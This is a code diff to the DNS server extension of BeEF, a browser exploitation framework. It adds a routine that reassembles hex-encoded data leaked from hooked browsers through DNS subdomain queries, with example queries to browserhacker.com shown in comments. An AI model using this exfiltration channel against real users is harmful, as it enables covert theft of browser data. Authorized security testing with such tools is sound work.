@@ -21,6 +21,7 @@ module BeEF
           super()
           @lock = Mutex.new
           @database = BeEF::Core::Models::Dns::Rule
+          @data_chunks = Hash.new
         end
 
         # Adds a new DNS rule. If the rule already exists, its current ID is returned.
@@ -139,6 +140,11 @@ module BeEF
           @lock.synchronize do
 	        print_debug "Received DNS request (name: #{name} type: #{format_resource(resource)})"
 
+            # no need to parse AAAA resources when data is extruded from client
+            if format_resource(resource) == 'A'
+              reconstruct(name)
+            end
+
             catch (:done) do
               # Find rules matching the requested resource class
               resources = @database.all(:resource => resource)
@@ -164,6 +170,43 @@ module BeEF
               end
             end
           end
+        end
+
+        private
+        # Collects and reconstructs data extruded by the client and found in subdomain, with structure like:
+        #0.1.5.4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f6e7.browserhacker.com
+        #[...]
+        #0.5.5.7565207175616d206469676e697373696d2065752e.browserhacker.com
+        def reconstruct(data)
+           split_data = data.split('.')
+           pack_id = split_data[0]
+           seq_num = split_data[1]
+           seq_tot = split_data[2]
+           data_chunk = split_data[3] # this might change if we store more than 63 bytes in a chunk (63 is the limitation from RFC)
+
+           if pack_id.match(/^(\d)+$/) and seq_num.match(/^(\d)+$/) and seq_tot.match(/^(\d)+$/)
+             print_debug "[DNS] Received chunk (#{seq_num} / #{seq_tot}) of packet (#{pack_id}): #{data_chunk}"
+
+             if @data_chunks[pack_id] == nil
+                # no previous chunks received, create new Array to store chunks
+                @data_chunks[pack_id] = Array.new(seq_tot.to_i)
+                @data_chunks[pack_id][seq_num.to_i - 1] = data_chunk
+             else
+               # previous chunks received, update Array
+               @data_chunks[pack_id][seq_num.to_i - 1] = data_chunk
+               if @data_chunks[pack_id].all? and @data_chunks[pack_id] != 'DONE'
+                 # means that no position in the array is false/nil, so we received all the packet chunks
+                 packet_data = @data_chunks[pack_id].join('')
+                 decoded_packet_data = packet_data.scan(/../).map{ |n| n.to_i(16)}.pack('U*')
+                 print_debug "[DNS] Packet data fully received: #{packet_data}. \n Converted from HEX: #{decoded_packet_data}"
+
+                 # we might get more DNS requests for the same chunks sometimes, once every chunk of a packet is received, mark it
+                 @data_chunks[pack_id] = 'DONE'
+               end
+             end
+           else
+             print_debug "[DNS] Data (#{data}) is not a valid chunk."
+           end
         end
 
       private
